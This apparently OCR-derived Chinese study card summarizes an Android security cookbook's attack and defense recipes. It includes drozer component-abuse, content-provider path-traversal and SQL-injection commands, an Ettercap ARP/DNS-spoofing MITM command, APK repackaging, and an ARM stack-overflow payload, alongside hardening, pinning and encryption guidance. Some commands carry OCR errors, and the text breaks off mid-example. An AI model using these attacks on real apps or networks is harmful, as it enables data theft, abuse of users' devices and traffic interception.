# 移动安全 · OCR 增补：可执行配方与排障

> 本卡由扫描件 OCR 后提取的 **23 个候选单元**按类型聚合而成，逐字引用、执行步骤、失败模式、书内案例均原样保留自 `candidates/ocr-batch-*.md`。这一批是「已提取、按类型归集」的增补材料，与同目录其他能力卡的三重验证 + 人工聚类流程不同，故单独标注，不冒充正式聚类卡。

## R — 原文 (Reading)

> 找到名为"META-INF"的那个文件夹, 其中含有签名文件和真正的 CERT.RSA 文件一一它是公钥证书的自签名。你可以用 Java IDK (在这之前你应该已经安装过它了) 自带的 keytool 工具查看其中的内容。下面这条命令会输出证书的内容 … keytool -Printcert -file META-INF/CERT.RSA
>
> — 《Android安全攻防实战》· 第 2 章「2.2 检查 app 的证书和签名」

> 考虑到你使用的可能是一个已经被签过名的 APK 文件，你首先要把 APK 文件中的证书和签名文件删掉 … rm -r [path-to-unzipped-apk] /META-INF … keytool -genkey -v -keystore [keystore 的名称] -alias [你密钥的别名] -keyalg RSA -keysize 2048 -validity [有效天数] … jarsigner -verbose -sigalg MD5withRSA -digestalg SHR1 -keystore [你的密钥存储器的名称] [你的.apk 文件] [你密钥的别名]
>
> — 《Android安全攻防实战》· 第 2 章「2.3 对 Android app 签名」

> dz> run app.package.list … dz> run app.package.info --package [包名] … dz> run app.package.info -P [权限标识] … dz> run app.activity.info … 这条命令将列出你的设备上所有导出的 activity。 … dz> run app.service.info --Permission null … dz> run app.broadcast.info … dz> app.package.attacksurface [包名] … Attack Surface: 5 activities exported 18 broadcast receivers exported 4 content providers exported 3 services exported Shared UID (com. google.uid. shared)
>
> — 《Android安全攻防实战》· 第 3 章「3.5–3.10」

> dz> run app.activity.start --action [intent action] --category [intent category] --component [package name] [component name] … dz> run app.service.start --action [ACTION] --category [CATEGORY] --data-uri [DATA-URI] --component [package name] [component name] --extra [TYPE KEY VALUE] ---mimetype [MIMETYPE] … dz> run app.broadcast.send --action [ACTION] --category [CATEGORY] ~-component [PACKAGE COMPONENT] -data-uri [DATA_URI] -extra [TYPE KEY VALUE] -flags [FLAGS*] -mimetype [MIMETYPE]
>
> — 《Android安全攻防实战》· 第 3 章「3.11 运行 activity」+ 第 4 章「4.5 攻击 service」+「4.6 攻击 broad

> dz> run app.provider.info --Permission null … dz> run app.provider.finduri [package] … dz> run app.provider.query [URI] … dz> run app.provider.download [URI] … dz> run app.provider.download content://[valid-URI]/../../[other file path] [local-path] … dz> run app.provider.insert [URI] [--boolean [name] [value]] [--integer [name] [value]] [--string [name] [value]]...
>
> — 《Android安全攻防实战》· 第 4 章「4.7 枚举有漏洞的 content provider」+「4.8 从有漏洞的 content provid

> ./data/tcpdump/tcpdump -w - | nc -1 -P 31337 … adb forward tcp:12345 tcp:31337 … netcat 127.0.0.1 12345 … adb forward tcp:12345 tcp:31337 && netcat 127.0.0.1 12345 | wireshark -k -S -i -
>
> — 《Android安全攻防实战》· 第 4 章「4.3 检查网络流量」

> String query = "select * from users table where username = '" + u_username + "' and password = '" + u_password +"'"; … dz> run app.provider.query [URI] --selection "1=1" … dz> run app.provider.query [URI] --selection "1-1=0" … dz> run app.provider.query [URI] --selection "(1+random())*10 > 1"
>
> — 《Android安全攻防实战》· 第 4 章「4.10 枚举有 SQL-注入漏洞的 content provider」

> dz> run app.package.debuggable … adb jdwp … adb forward tcp: [本地端口] jdwp: [Android 设备上的 jdwp 端口] … jdb -attach localhost: [PORT] … > classes … > methods [class-path] … > fields [class name ]
>
> — 《Android安全攻防实战》· 第 4 章「4.11 利用可调试的app」

> ettercap -T -I [interface] -M ARP:remote -P dns spoof /[address of target] /[address of gateway]/ … sudo ettercap -T -i wlan0 -M ARP:remote -P dns_spoof /192.168.10.1/ /192.168.10.106/ … microsoft .com    A  198.182.196.56 … *.Linkedin.com A 192.168.106.102
>
> — 《Android安全攻防实战》· 第 4 章「4.12 对 app 做中间人攻击」

> < [组件名] android:exported="false"> … <permission android:name="android.permission.CUSTOM_ PERMISSION" android:protectionLevel="normal" android:description="My custom permission" android: label="@string/custom_permission_label"> … <provider android:writePermission="[write permission name]" android: readPermission="[read permission name]"> … <path-permission android:path="/[path name]" android:permission="[read/write permission name]" android: readPermission="[read permission name]" android: writePermission="[write permission name] ">
>
> — 《Android安全攻防实战》· 第 5 章「5.2 保护 app 的组件」+「5.3 通过定制权限保护组件」+「5.4 保护 content provi

> 要确保攻击者不能把来路不明的 SQL 内容注入到你的查询语句中去，最好的办法就是: 避免使用 SQLiteDatabase.rawQuery()，而改用一个参数化的语句。使用一个预先编译好的语句，比如 SQLiteStatement，提供对参数的绑定 (binding) 和转换 (escaping)，以防御 SQL 注入攻击。 … INSERT VALUES INTO [table name] (?,?,?,?,...) … insertStatement.bindString(1, item.getContent ()); … Cursor cursor = db.query(TABLE NAME, null, COL_TITLE + "LIKE ?", new String[] { "%" + searchTerm + "%" }, null, null, null);
>
> — 《Android安全攻防实战》· 第 5 章「5.5 防御 SQL 注入攻击」

> PackageInfo packageInfo = context.getPackageManager ().getPackageInfo (context.getPackageName (), PackageManager.GET_SIGNATURES); … String currentSignature = calcSHA1(signatureBytes); … return CERTIFICATE_SHA1.equalsIgnoreCase (currentSignature); … String installerPackageName = context.getPackageManager ().getInstallerPackageName (context.getPackageName ()); … boolean kernelQemu = getProperty (systemPropertyClazz, "ro.kernel.qemu").length() > 0; … boolean hardwareGoldfish = getProperty(systemPropertyClazz, "ro.hardware").equals ("goldfish"); … return (context.getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE) != 0;
>
> — 《Android安全攻防实战》· 第 5 章「5.6 验证 app 的签名

> proguard.config=${sdk.dir}/tools/proguard/proguard-android.txt:proguard-project.txt … -assumenosideeffects class android.util.Log { public static boolean isLoggable (java.lang.String, int); public static int v(...); public static int i(...); public static int w(...); public static int d(...); public static int e(...); } … -encryptstrings interface com.packt.android.security.Constants { public static final java.lang.String CERTIFICATE_SHA1; } … -accessthroughreflection class com.packt.android.security.Tamper { boolean verifyAppSignature (Context); }
>
> — 《Android安全攻防实战》· 第 5 章「5.8 用 ProGuard 删除所有日志消息」+「5.9 用 DexGuard 进行高级代码混淆」

> baksmali [Dex filename] .dex … .class public LExample; … .method public constructor <init>()V … .registers 1 … invoke-direct {p0}, Ljava/lang/Object;-><init>()V … return-void … move vA,vB … invoke-virtual {v0, vl, v2}, Ljava/io/PrintStream;->printf (Ljava/lang/String; [Ljava/lang/Object;) Ljava/io/PrintStream; … sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream; … const-string vl, "Hello World!\n"
>
> — 《Android安全攻防实战》· 第 6 章「6.4 解释 Dalvik 字节码」

## I — 方法论骨架 (Interpretation)

**用 keytool 与 openssl 提取 APK 证书指纹与公钥信息** — APK 本质是 ZIP，签名材料集中在 `META-INF/` 下。`CERT.RSA` 是 X.509 v3 自签名证书，`keytool -Printcert` 解析出 Owner/Issuer/Serial/Validity/MD5/SHA1 指纹；`openssl pkcs7 -inform DER -in META-INF/CERT.RSA -noout -print_certs -text` 给出完整公钥与签名算法。两条命令互补——openssl 能看到 keytool 不显示的公钥模数与 CA 签名段。指纹是判断同一开发者、识别恶意 app 复用证书的关键依据。

**删除原签名后用 jarsigner 给 APK 重新签名** — Android 安装时只校验 APK 自签名是否一致，不校验证书链可信度。删除原 `META-INF/`、生成自签 keystore、用 jarsigner 重新签名三步即可把任意 APK 改成"你的"应用。这也是篡改 / 重打包攻击的标准流程，反过来也是验证 app 完整性防护是否到位的测试用例。

**drozer app.package.attacksurface 枚举设备组件攻击面** — drozer 把 PackageManager API 镜像成 `app.{package,activity,service,broadcast,provider}.info` 模块。`-f` 按名过滤，`-P` 按权限反查（找持有特定危险权限的 app），`-u` 含未导出组件。最关键的是 `app.package.attacksurface <pkg>`——一行命令输出导出 activity/receiver/provider/service 计数 + 是否 debuggable + 是否 SharedUID。源码用 `GET_ACTIVITIES | GET_RECEIVERS | GET_PROVIDERS | GET_SERVICES` 标志位一次拉全，对每个数组 `match_filter(..., 'exported', True)` 计数。这是 app 安全评估的第一步——先把攻击面摸清。

**drozer 投递 intent 触发导出组件（activity/service/broadcast）** — drozer 把 `am start` 的高级用法封装成 `app.activity.start` / `app.service.start` / `app.broadcast.send`。源码（`activity.py:166-174`）显示：`Intent.fromParser(arguments)` 解析参数 → 若无 flags 自动加 `ACTIVITY_NEW_TASK` → `intent.isValid()` 校验（action 或 component 必须有一个）→ `self.getContext().startActivity(intent.buildIn(self))`。攻击者可在无任何权限的 app 上下文里向导出组件投递任意 intent。`app.broadcast.send` 是最危险的——broadcast receiver 常处理 SEND_SMS 类敏感 action。

**drozer app.provider 数据提取、插入与路径遍历** — 无 readPermission 的导出 provider 是数据泄漏攻击面。`app.provider.finduri <pkg>` 通过 `self.extractFromZip("classes.dex", path, self.cacheDir())` 解出 DEX，再 `getStrings(...)` 后 `filter(lambda s: ("CONTENT://" in s.upper()) and ("CONTENT://" != s.upper()), strings)` 抓所有 content URI 字符串——开发者通常把 URI 以静态字符串硬编码在源码里。`app.provider.query <URI>` 直接读数据；`app.provider.download content://X/../../etc/hosts /tmp/out` 利用 PATTERN_LITERAL 路径匹配的弱点——路径末尾加 `/` 即可绕过（`/Keys` 受保护但 `/Keys/` 不匹配，于是无权限读出 PIN）。`app.provider.insert` 可注入数据篡改账户。

**用 ADB port forward + tcpdump + netcat + Wireshark 嗅探 Android 流量** — 设备 root 后部署 ARM 版 tcpdump，让它抓包并以 `-w -` 输出到 stdout，经管道交给本机 nc 监听 31337 端口；PC 端用 `adb forward tcp:12345 tcp:31337` 把设备端口映射到本机，再 `netcat 127.0.0.1 12345 | wireshark -k -S -i -` 实时把原始 pcap 流喂给 Wireshark 解析。`-k` 立即开始抓包，`-S` 设快照长度，`-i -` 从 stdin 读。整套链路让 PC 上的 Wireshark 实时显示 Android 设备的全部网络流量，无需在设备上跑 GUI。OCR 文本指出可替换为 Snort 做 IDS。

**drozer SQL 注入 content provider（selection 与 projection）** — Android content provider 的 `query(Uri, String[] projection, String selection, String[] selectionArgs, String sortOrder)` 中，`selection` 直接拼进 SQL WHERE 子句、`projection` 拼进 SELECT 子句。若开发者用 `db.rawQuery(...)` 字符串拼接而非参数化，攻击者可注入 `--selection "1=1"` 让 WHERE 恒真返回全表。作者强调审计时也要看 projection——「projection，selection，selectionArgs 以及 sortOrder 这些变量没有一个是直接来自外部 app 的。如果 content provider 是导出的, 而且被典予了 URI 权限，或者像我们前面看到的那样，不需要任何权限，这也就意味着攻击者可以注入任意的 SQL 语句」。

**利用可调试 app 通过 jdb 提取类与字段** — manifest 中 `android:debuggable="true"` 的 app 在启动时 Dalvik/ART 会打开 JDWP（Java Debug Wire Protocol）端口。`adb jdwp` 列出设备上所有 JDWP 端口 PID；`adb forward tcp:PORT jdwp:PID` 把它映射到本机；`jdb -attach localhost:PORT` 接入后即可用 `classes` / `methods <class>` / `fields <class>` 反射式枚举 app 内存中所有类、方法、字段值。作者警告「在谷歌应用商店里的一些 app 仍然被标记为可调试」——开发者常忘记在 release 构建里关掉它。姜饼人（Android 2.3）及更低版本的 Dalvik 会在 ADB 未运行时也主动连 JDWP，使恶意 app 能远程执行任意代码。

**用 Ettercap ARP 欺骗 + DNS spoof 对 app 做中间人攻击** — Ettercap 滥用 ARP 无认证的缺陷，向目标 Android 设备发送伪造 ARP 应答，让它误以为攻击者机器才是网关；同时启用 `dns_spoof` 插件，按 `/usr/share/ettercap/etter.dns` 中定义的 `*.linkedin.com A <attacker IP>` 把域名解析到攻击者 IP。攻击者控制 app 的网络资源后可识别 app 行为、定位、控制设备——「如果该设备是可以 root 的或者已经 root 了的话」。这是验证 app 是否做了 SSL pinning（CU-19）的标准测试场景。

**用 exported=false + 定制权限 + path-permission 加固组件** — 三层加固——(1) 不需跨 app 调用的组件直接 `exported="false"`（有 intent-filter 且未显式设 exported 时系统推断为 true，必须显式写 false）；(2) 必须共享的组件定义 `<permission>` 并赋给组件 `android:permission`，`protectionLevel="signature"` 仅同签名 app 可访问；(3) content provider 在 `<provider>` 级设 `readPermission`/`writePermission` 后，再用 `<path-permission>` 给敏感路径（如 `/Keys`）单独加权限——path 级权限优先级高于 provider 级。作者警告「被赋予了写访问权限之后,也就拥有了读访问权限 [是不对的] … Android 恰当地遵循了最佳实践，并且需要对读和写访问分别进行独立的权限声明」。

**用 SQLiteStatement 参数化语句防 SQL 注入** — `SQLiteStatement` 预编译 SQL 后用 `bindString(index, value)` 绑定参数——数据库引擎自己处理转义，攻击者输入永远不会被解析为 SQL 语法。`SQLiteDatabase.query(table, columns, selection, selectionArgs, ...)` 的 `selectionArgs` 数组同理：`selection` 中 `?` 占位符会被 `selectionArgs` 顺序替换，且替换值经过转义。预编译还有性能收益——「数据库就不必在每次执行时都要对语句进行一番解析了」。绑定索引从 1 开始，对应 SQL 中 `?` 的位置。

**运行时验证 app 签名 + 检测模拟器/调试/安装程序反逆向** — 三道反逆向检测——(1) **签名验证**：编译期用 `keytool -list -v -keystore your_app.keystore` 拿证书 SHA1，去掉冒号写死在 `CERTIFICATE_SHA1` 常量里；运行时用 `PackageManager.GET_SIGNATURES` 取当前签名，`MessageDigest.getInstance("SHA1")` 算 hash 比对。攻击者重签后 hash 不匹配即拒跑。(2) **模拟器检测**：通过反射调隐藏类 `android.os.SystemProperties`，检查 `ro.kernel.qemu` / `ro.hardware=goldfish` / `ro.product.model=sdk` 三个标志位任一为真即模拟器。(3) **调试/安装源检测**：`ApplicationInfo.FLAG_DEBUGGABLE` 检 debuggable 位；`getInstallerPackageName` 检查安装来源是否以 `com.google.android` 开头（即 Play 商店）。

**用 ProGuard -assumenosideeffects 删日志 + DexGuard API 隐藏与字符串加密** — (1) **ProGuard 删日志**：写一个 `LogWrap` 包装类替换所有 `android.util.Log.*` 调用，在 `proguard-project.txt` 加 `-assumenosideeffects class android.util.Log`——ProGuard 优化 pass 会把所有对 Log 方法返回值无副作用的调用整行删除。需启用 `proguard-android-optimize.txt`（比默认 `proguard-android.txt` 更激进）。(2) **DexGuard 字符串加密**：`-encryptstrings class com.packt.android.security.MainActivity` 把指定类/接口中所有字符串常量（如 `CERTIFICATE_SHA1` hash）编译期加密，运行时解密——攻击者反编译看不到明文 hash。(3) **DexGuard API 隐藏**：`-accessthroughreflection class com.packt.android.security.Tamper { boolean verifyAppSignature(Context); }` 把对 `verifyAppSignature` 的调用转成反射调用，类名/方法签名存为字符串再被字符串加密保护——攻击者很难定位防篡改代码在哪。

**用 baksmali 反编译 DEX 到 smali 并解读 Dalvik 字节码** — Dalvik 字节码是基于寄存器的（JVM 是基于栈的）。操作数顺序「目标-源」——`move vA, vB` 把 vB 写入 vA。每个方法是独立执行实体，有自己的栈帧（寄存器 + 程序计数器 + 指向 DEX 的指针）。`baksmali` 把 DEX 反编译为 `.smali` 文本文件，每条指令对应一行。常见指令：`invoke-direct`（调 private/构造方法）、`invoke-virtual`（调虚方法）、`sget-object`（取静态对象字段）、`const-string`（加载字符串到寄存器）、`new-array`（构造数组）、`return-void`（返回）。方法签名用 Dalvik 类型描述符：`L` 前缀类名、`[` 前缀数组、`V` 表示 void——`([Ljava/lang/String;)V` = 接收 String[] 返回 void。

**用 Dex2Jar + JD-GUI 反编译 DEX 回 Java + objdump 反编译 native .so** — Dex2Jar 把 DEX 字节码转回 Java .class 文件（输出 JAR），JD-GUI 再把 .class 反编译为可读 Java 源码。两步组合可在不读 smali 的情况下快速理解 app 逻辑——但作者明确警告「许多方法能让常见反编译器不能正常工作，包括使用反射机制和使用非标准的 DEX 变形指令」。Native 库（.so）是 ARM ELF 二进制，用 NDK 自带的 `arm-linux-androideabi-objdump -D` 反汇编，需理解 ARM 指令集与 ELF 格式。NDK toolchain 自带正确版本的 objdump，能处理 ARM 字节序与可执行文件结构。

**用 BKS truststore + 自定义 X509TrustManager 验证自签名 SSL 证书** — Android 系统信任约 130 个 CA，自签名证书不在其中会触发 `SSLHandshakeException`。正确做法：(1) 用 `openssl s_client -showcerts -connect host:443 </dev/null` 抓证书 PEM；(2) 用 Bouncy Castle provider 把证书导入 BKS 格式 `customtruststore.bks`；(3) 在 app `res/raw/` 放 truststore；(4) 加载到 `KeyStore` 对象；(5a) `DefaultHttpClient` 子类重写 `createClientConnectionManager()` 注册自定义 `SSLSocketFactory(loadKeyStore())`；或 (5b) 自定义 `X509TrustManager` 包装系统 `TrustManagerFactory`，用本地 truststore 初始化，再传给 `SSLContext.init(...)`。作者强烈警告「不能做的事」：网上的 `TrustAllX509TrustManager` 让 `checkServerTrusted` 空实现——「这使得 HTTPS 通信完全暴露在中间人攻击(man-in-the-middle，MITM)的危险下，完全抹杀了使用证书的意义」。

**用公钥 SHA1 pin 实现 SSL pinning** — 仅信任系统 CA 不够——某个 CA 被黑后攻击者可签发你域名的证书做 MITM。SSL pinning 把信任面再收窄到具体公钥。流程：(1) 用独立 Java 程序 `CalcPins.java` 连目标服务器，在 `checkServerTrusted` 中遍历证书链每个 `X509Certificate.getPublicKey().getEncoded()`，算 SHA1 hash 输出十六进制；(2) 把这些 hash 写死在 app 的 `String[] pins` 数组；(3) 运行时 `PubKeyPinningTrustManager.checkServerTrusted` 对链中每个证书算公钥 hash，与 pins 比对，全部不匹配则抛 `CertificateException`。公钥 pin 而非证书 pin 的好处——证书续期后公钥不变，app 不必升级。

**用 find -perm 找危险权限文件（setuid / 全可写 / 全可执行）** — Linux 文件权限分三类用户（owner/group/other）× 五种权限（r/w/x/S/setuid/s/setgid）。八进制编码：r=4, w=2, x=1，setuid=4000, setgid=2000, sticky=1000。`find -perm MODE` 精确匹配，`-perm -MODE` 匹配"这些位被设为 1"的文件。Android 提权审计关键命令：`-perm -4111` 找 setuid 可执行文件（如 `su`，找到即设备已 root）；`-perm -2111` 找 setgid 可执行文件；`-perm 0222` 找全可写文件（攻击者可注入恶意内容）；`-user 0` 找 root 拥有的文件；`-user 10170` 找特定 app UID 拥有的文件（app UID = aXXX + 10000）。配合 `stat -c "%A %u %g %f %N"` 格式化输出更易读。

**用 NDK 交叉编译原生可执行程序并去除 stack-protector** — NDK 编译原生可执行三件套——`jni/Android.mk`（`LOCAL_PATH` + `LOCAL_MODULE` + `LOCAL_SRC_FILES` + `include $(BUILD_EXECUTABLE)`）+ `jni/<name>.c` 源码 + `ndk-build` 命令。默认开启 stack-protector：GCC 在函数 prologue 把 `__stack_chk_guard`（运行时由伪随机数发生器写入）压栈，epilogue 比对栈中副本与原值——不一致调 `__stack_chk_fail` 终止。要研究栈溢出利用，需编辑 `[NDK]/toolchains/arm-linux-androideabi-[ver]/setup.mk` 删除 `-fstack-protector` 标志位，重新 `ndk-build`。`arm-linux-androideabi-objdump -D` 解析产物，对比有无 stack-protector 时函数 prologue/epilogue 的差异——有保护时多出 `ldr r4, [pc, #40]; ldr r3, [r4, #0]; str r3, [sp, #12]` 与 `ldr r2, [sp, #12]; cmp r2, r3; beq.n; blx __stack_chk_fail`。

**利用 ARM 栈溢出覆盖 LR 控制返回地址** — ARM 函数 prologue `push {r0,r1,r2,r3,r4,lr}` 把 LR（返回地址）压栈，epilogue `pop {pc}` 把栈顶弹入 PC 完成返回。`vulnerable()` 中 `char dest[10]; strcpy(dest, src);`——输入超过 10 字节即越界写栈。在 GDB 中 `x/32xw $sp` 看栈布局：dest 缓冲区之后紧跟保存的 LR 值。输入 16 字节后，strcpy 的 NULL 终止符覆盖 LR 最低字节（`0x000084f5 → 0x00008400`）；再加 2 字节即可完全覆盖 2 字节 LR。攻击者构造 `[16 padding chars]\xfc\x84` 让 LR 变成 `0x000084fc`——`main` 中跳过 `printf("you lose...")` 直接 `pop {r3, pc}` 返回。ARM 小端序，地址字节需逆序输入。

**交叉编译 Radamsa + bash 脚本 fuzzing dexdump** — Radamsa 是基于变异的 fuzzer，对种子文件做比特翻转/字节重复/子串删除等操作生成畸形输入。Android NDK 默认 GCC 不认 `typedef unsigned long in_addr_t;`——编译失败时报 `'in_addr_t' undeclared`。修复：在 radamsa.c 第 3222 行把 `in_addr_t` 替换为 `unsigned long`，第 2686 行注释掉 typedef。部署后用 BusyBox bash 跑 fuzzing 脚本：循环 `cat seed.dex | radamsa -m bf,br,sr -p bu > fuzz.dex; dexdump -d fuzz.dex 2>&1 > /dev/null; RET_CODE=$?; test $RET_CODE -gt 127 && cp fuzz.dex win-dexdump_$ITER_$c.dex`。返回码 >127 表示进程被信号杀死（如 SIGSEGV=139），即触发了崩溃——复制该 fuzz.dex 留作后续分析。

**用 PBKDF2 推导 AES 密钥 + SQLCipher 加密 SQLite 数据库** — 三层加密方案——(1) **设备端 AES-CBC 加密**：`SecureRandom` 默认构造（Android 4.2+ 用 OpenSSL provider，最强）→ `KeyGenerator.getInstance("AES").init(256, random)` 生成 256 位密钥；IV 32 字节随机；`Cipher.getInstance("AES/CBC/PKCS5Padding")` 加密。**绝对不能简单用 `AES`**——默认 ECB 模式弱，必须显式 `AES/CBC/PKCS5Padding` 或 `AES/GCM/NoPadding`（GCM 自带认证）。(2) **PBE 推导密钥**：root 设备上 SharedPreferences 沙箱不可靠，密钥需从用户口令推导——`SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1").generateSecret(new PBEKeySpec(password, salt, 10000, 256))`。10000 次迭代使暴力破解成本高（Android 加密备份同值）；salt 32 字节随机，存 SharedPreferences。(3) **SQLCipher 加密 SQLite**：导入 `net.sqlcipher.database.*` 替换 `android.database.sqlite.*`，`SQLiteDatabase.loadLibs(context)` 加载原生库，`SQLiteDatabase.openOrCreateDatabase(name, password, null)` 创建加密库——每页 256 位 AES-CBC 加密 + 独立 IV + MAC 完整性校验。

**用 DeviceAdminReceiver 强制设备加密与超时锁屏策略** — 设备管理 API（Android 2.2+）让 app 获得超越普通权限的系统级控制力，主要用于企业 MDM 场景。配置三件套：(1) `res/xml/admin_policy.xml` 中 `<uses-policies>` 声明策略（`<force-lock/>` 超时锁屏、`<encrypted-storage/>` 强制加密、`<wipe-data/>` 恢复出厂、`<disable-camera/>` 禁用摄像头等）；(2) `DeviceAdminReceiver` 子类接收系统广播——`onEnabled` 时强制执行策略，`onDisabled` 时擦除 app 数据防止泄露；(3) manifest 中 `<receiver android:permission="BIND_DEVICE_ADMIN">` 绑定 receiver + `<meta-data android:resource="@xml/admin_policy">` 引用策略 XML。app 不能在安装时自动成为设备管理员——必须通过 `DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN` intent 启动系统 activity 让用户确认。`setMaximumTimeToLock` 设超时锁屏（毫秒），`getStorageEncryptionStatus` 查加密状态，`ENCRYPTION_STATUS_INACTIVE` 时调 `ACTION_START_ENCRYPTION` 引导用户开启。多策略冲突时系统选最严格那个。

## A1 — 应用示例 (Application Example)

### 示例 1: 用 keytool 与 openssl 提取 APK 证书指纹与公钥信息
- **类型与来源**: 【recipe】《Android安全攻防实战_ocr.txt》· 第 2 章「2.2 检查 app 的证书和签名」（Page 43–51）
- **问题/输入**: 已装 JDK 与 openssl；目标 APK 可从设备 `adb pull /system/app/Contacts.apk` 取出，或任意来源 APK
- **方法论的使用**: APK 本质是 ZIP，签名材料集中在 `META-INF/` 下。`CERT.RSA` 是 X.509 v3 自签名证书，`keytool -Printcert` 解析出 Owner/Issuer/Serial/Validity/MD5/SHA1 指纹；`openssl pkcs7 -inform DER -in META-INF/CERT.RSA -noout -print_certs -text` 给出完整公钥与签名算法。两条命令互补——openssl 能看到 keytool 不显示的公钥模数与 CA 签名段。指纹是判断同一开发者、识别恶意 app 复用证书的关键依据。
- **结果**: 【亲历】作者用 AVD 中 `Contacts.apk` 演示，证书 Owner 为 `EMAILADDRESS=android@android.com, CN=Android, OU=Android, O=Android, L=Mountain View, ST=California, C=US`，SHA1 `58:36:8C:FF:2D:A2:68:69:96:BC:95:EA:C1:90:EA:A4:F5:63:0F:E5`（Page 47）

### 示例 2: 删除原签名后用 jarsigner 给 APK 重新签名
- **类型与来源**: 【recipe】《Android安全攻防实战_ocr.txt》· 第 2 章「2.3 对 Android app 签名」（Page 52–55）
- **问题/输入**: JDK；目标 APK；私钥口令需牢记；OCR 文本中 `-digestalg SHR1` 应为 `SHA1` 的 OCR 错字 [OCR]
- **方法论的使用**: Android 安装时只校验 APK 自签名是否一致，不校验证书链可信度。删除原 `META-INF/`、生成自签 keystore、用 jarsigner 重新签名三步即可把任意 APK 改成"你的"应用。这也是篡改 / 重打包攻击的标准流程，反过来也是验证 app 完整性防护是否到位的测试用例。
- **结果**: 【亲历】作者用 `releasekey.keystore` / `keyalias` 演示，证书填写为 `CN=Keith Makan, OU=ACME, O=ACME Computers, L=Cape Town, ST=Western Cape, C=ZA`（Page 53）

### 示例 3: drozer app.package.attacksurface 枚举设备组件攻击面
- **类型与来源**: 【recipe】《Android安全攻防实战_ocr.txt》· 第 3 章「3.5–3.10」（Page 90–100, 106–108）
- **问题/输入**: drozer agent 已部署，console 已 connect
- **方法论的使用**: drozer 把 PackageManager API 镜像成 `app.{package,activity,service,broadcast,provider}.info` 模块。`-f` 按名过滤，`-P` 按权限反查（找持有特定危险权限的 app），`-u` 含未导出组件。最关键的是 `app.package.attacksurface <pkg>`——一行命令输出导出 activity/receiver/provider/service 计数 + 是否 debuggable + 是否 SharedUID。源码用 `GET_ACTIVITIES | GET_RECEIVERS | GET_PROVIDERS | GET_SERVICES` 标志位一次拉全，对每个数组 `match_filter(..., 'exported', True)` 计数。这是 app 安全评估的第一步——先把攻击面摸清。
- **结果**: 【亲历】作者演示 `app.package.attacksurface com.google.android.gst` 输出「5 activities / 18 broadcast receivers / 4 content providers / 3 services exported / Shared UID (com.google.uid.shared)」（Page 106）；`app.activity.info -f facebook` 列出 `com.facebook.katana.LoginActivity` 等（Page 97）

### 示例 4: drozer 投递 intent 触发导出组件（activity/service/broadcast）
- **类型与来源**: 【recipe】《Android安全攻防实战_ocr.txt》· 第 3 章「3.11 运行 activity」+ 第 4 章「4.5 攻击 service」+「4.6 攻击 broadcast receiver」（Page 108–109, 119–122）
- **问题/输入**: drozer agent 已部署；已知目标组件全限定名 + intent-filter action；广播 receiver 的 extra 字段名（阅读 manifest 或源码获得）
- **方法论的使用**: drozer 把 `am start` 的高级用法封装成 `app.activity.start` / `app.service.start` / `app.broadcast.send`。源码（`activity.py:166-174`）显示：`Intent.fromParser(arguments)` 解析参数 → 若无 flags 自动加 `ACTIVITY_NEW_TASK` → `intent.isValid()` 校验（action 或 component 必须有一个）→ `self.getContext().startActivity(intent.buildIn(self))`。攻击者可在无任何权限的 app 上下文里向导出组件投递任意 intent。`app.broadcast.send` 是最危险的——broadcast receiver 常处理 SEND_SMS 类敏感 action。
- **结果**: 【亲历】作者用 OWASP GoatDroid 演示 broadcast 攻击：receiver `.SendSMSNowReceiver` 无权限保护 + app 持有 `SEND_SMS` → 攻击者 drozer 一行命令给任意号码发短信「PWNED」（Page 122）；三星 Galaxy S3 上 SystemUI DoS（Page 119）

### 示例 5: drozer app.provider 数据提取、插入与路径遍历
- **类型与来源**: 【recipe】《Android安全攻防实战_ocr.txt》· 第 4 章「4.7 枚举有漏洞的 content provider」+「4.8 从有漏洞的 content provider 中提取数据」+「4.9 向 content provider 插入数据」（Page 123–130）
- **问题/输入**: drozer agent 已部署；目标 provider 已导出且无足够权限保护
- **方法论的使用**: 无 readPermission 的导出 provider 是数据泄漏攻击面。`app.provider.finduri <pkg>` 通过 `self.extractFromZip("classes.dex", path, self.cacheDir())` 解出 DEX，再 `getStrings(...)` 后 `filter(lambda s: ("CONTENT://" in s.upper()) and ("CONTENT://" != s.upper()), strings)` 抓所有 content URI 字符串——开发者通常把 URI 以静态字符串硬编码在源码里。`app.provider.query <URI>` 直接读数据；`app.provider.download content://X/../../etc/hosts /tmp/out` 利用 PATTERN_LITERAL 路径匹配的弱点——路径末尾加 `/` 即可绕过（`/Keys` 受保护但 `/Keys/` 不匹配，于是无权限读出 PIN）。`app.provider.insert` 可注入数据篡改账户。
- **结果**: 【亲历】作者用 MWR Sieve（故意有漏洞的 app）演示：`app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/` 绕过 `READ_KEYS` 权限，读出 Password 列 `k3170makank3170makan / 1234`（Page 128）；插入后 `_id=3` 行出现 `injected/injected/woopwoop`（Page 130）

### 示例 6: 用 ADB port forward + tcpdump + netcat + Wireshark 嗅探 Android 流量
- **类型与来源**: 【recipe】《Android安全攻防实战_ocr.txt》· 第 4 章「4.3 检查网络流量」（Page 106–110）
- **问题/输入**: 设备已 root；Android 版自带 nc（多数版本有，没有则从 `android.googlesource.com/platform/external/netcat` NDK 编译）；PC 装 Wireshark + Netcat
- **方法论的使用**: 设备 root 后部署 ARM 版 tcpdump，让它抓包并以 `-w -` 输出到 stdout，经管道交给本机 nc 监听 31337 端口；PC 端用 `adb forward tcp:12345 tcp:31337` 把设备端口映射到本机，再 `netcat 127.0.0.1 12345 | wireshark -k -S -i -` 实时把原始 pcap 流喂给 Wireshark 解析。`-k` 立即开始抓包，`-S` 设快照长度，`-i -` 从 stdin 读。整套链路让 PC 上的 Wireshark 实时显示 Android 设备的全部网络流量，无需在设备上跑 GUI。OCR 文本指出可替换为 Snort 做 IDS。
- **结果**: 【亲历】作者完整演示 6 步链路（Page 107–110）

### 示例 7: drozer SQL 注入 content provider（selection 与 projection）
- **类型与来源**: 【recipe】《Android安全攻防实战_ocr.txt》· 第 4 章「4.10 枚举有 SQL-注入漏洞的 content provider」（Page 131–133）
- **问题/输入**: drozer agent 已部署；目标 provider 导出 + 无参数化（源码层用 `rawQuery`）
